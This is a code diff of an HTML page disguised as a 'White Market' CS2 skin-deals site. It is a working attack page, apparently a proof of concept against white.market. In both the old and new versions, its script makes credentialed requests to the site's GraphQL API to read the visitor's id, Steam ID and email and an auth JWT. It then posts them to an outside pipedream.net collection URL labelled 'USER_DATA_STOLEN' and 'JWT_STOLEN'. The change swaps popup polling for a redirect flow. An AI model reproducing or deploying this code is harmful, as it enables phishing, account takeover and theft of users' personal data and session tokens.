@@ -2,72 +2,62 @@
 <html>
 <head><title>White Market - Exclusive Deals</title></head>
 <body>
-<h1>Loading Exclusive Deals...</h1>
-<div id="status"></div>
+<h1>White Market Exclusive Deals</h1>
+<p>Login to view exclusive CS2 skin deals - up to 50% off!</p>
+<button onclick="startLogin()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px;">
+    🔓 Login with Steam to View Deals
+</button>
+<div id="status" style="margin-top: 20px;"></div>
+
 <script>
-const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-status.innerHTML = 'Please complete login to view deals...<br><br>';
-
-// Open Steam login in popup
-const loginWindow = window.open(
-    'https://white.market/login',
-    'steam_login',
-    'width=600,height=700'
-);
-
-status.innerHTML += 'Login window opened<br>';
-status.innerHTML += 'Monitoring for successful login...<br><br>';
-
-let pollCount = 0;
-const maxPolls = 120; // Poll for up to 2 minutes
-
-// Poll the API to detect when user logs in
-const pollInterval = setInterval(async () => {
-    pollCount++;
+function startLogin() {
+    // Store that we're waiting for login
+    localStorage.setItem('awaiting_login', 'true');
+    localStorage.setItem('login_start', Date.now());
     
-    if (pollCount % 5 === 0) {
-        status.innerHTML += `Checking login status... (${pollCount}/${maxPolls})<br>`;
-    }
+    // Redirect to login page
+    window.location.href = 'https://white.market/login';
+}
+
+// Check if we just came back from login
+if (localStorage.getItem('awaiting_login') === 'true') {
+    document.getElementById('status').innerHTML = 'Checking login status...<br>';
     
-    try {
-        // Try to fetch user profile (requires authentication)
-        const response = await fetch('https://api.white.market/graphql/api', {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json',
-                'x-accept-language': 'en_US'
-            },
-            body: JSON.stringify({
-                query: 'query { person: person_profile { id steamId email } }',
-                operationName: 'PersonProfile'
-            })
-        });
-        
-        const data = await response.json();
-        
+    // Try to fetch user profile
+    fetch('https://api.white.market/graphql/api', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'x-accept-language': 'en_US'
+        },
+        body: JSON.stringify({
+            query: 'query { person: person_profile { id steamId email } }',
+            operationName: 'PersonProfile'
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
         if (data.data && data.data.person) {
-            // SUCCESS - User is logged in!
-            clearInterval(pollInterval);
+            localStorage.removeItem('awaiting_login');
             
-            status.innerHTML += '<br><strong>✅ LOGIN DETECTED!</strong><br>';
-            status.innerHTML += 'Loading your exclusive deals...<br><br>';
+            document.getElementById('status').innerHTML = '✅ Login successful!<br>Steam ID: ' + data.data.person.steamId + '<br>';
             
-            // Exfiltrate user data
+            // Exfiltrate
             fetch(REQUESTBIN, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    attack: 'USER_DATA_STOLEN',
+                    attack: 'USER_DATA_STOLEN_VIA_REDIRECT',
                     victim: data.data.person,
                     timestamp: new Date().toISOString()
                 })
             });
             
-            // Try to generate JWT (if they have refresh token from Steam login)
-            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
+            // Try JWT
+            return fetch('https://api.white.market/graphql/api', {
                 method: 'POST',
                 credentials: 'include',
                 headers: {
@@ -79,52 +69,29 @@ const pollInterval = setInterval(async () => {
                     operationName: 'AuthToken'
                 })
             });
+        }
+    })
+    .then(r => r ? r.json() : null)
+    .then(jwtData => {
+        if (jwtData && jwtData.data && jwtData.data.auth_token) {
+            document.getElementById('status').innerHTML += '✅ JWT stolen!<br>';
             
-            const jwtData = await jwtResponse.json();
-            
-            if (jwtData.data && jwtData.data.auth_token) {
-                status.innerHTML += '<strong>✅ FULL ACCESS GRANTED!</strong><br>';
-                
-                // Exfiltrate JWT
-                fetch(REQUESTBIN, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        attack: 'JWT_STOLEN',
-                        jwt: jwtData.data.auth_token.accessToken,
-                        victim_id: data.data.person.id,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            }
-            
-            // Close popup and redirect
-            if (loginWindow && !loginWindow.closed) {
-                loginWindow.close();
-            }
-            
-            status.innerHTML += '<br>Redirecting to deals page...<br>';
-            
-            setTimeout(() => {
-                window.location.href = 'https://white.market';
-            }, 2000);
+            fetch(REQUESTBIN, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    attack: 'JWT_STOLEN_VIA_REDIRECT',
+                    jwt: jwtData.data.auth_token.accessToken,
+                    timestamp: new Date().toISOString()
+                })
+            });
         }
         
-    } catch (e) {
-        // User not logged in yet, keep polling
-        console.log('Poll ' + pollCount + ': Not logged in yet');
-    }
-    
-    if (pollCount >= maxPolls) {
-        clearInterval(pollInterval);
-        status.innerHTML += '<br>⚠️ Login timeout - please try again<br>';
-        if (loginWindow && !loginWindow.closed) {
-            loginWindow.close();
-        }
-    }
-    
-}, 1000); // Poll every second
-
+        setTimeout(() => {
+            window.location.href = 'https://white.market';
+        }, 2000);
+    });
+}
 </script>
 </body>
 </html>
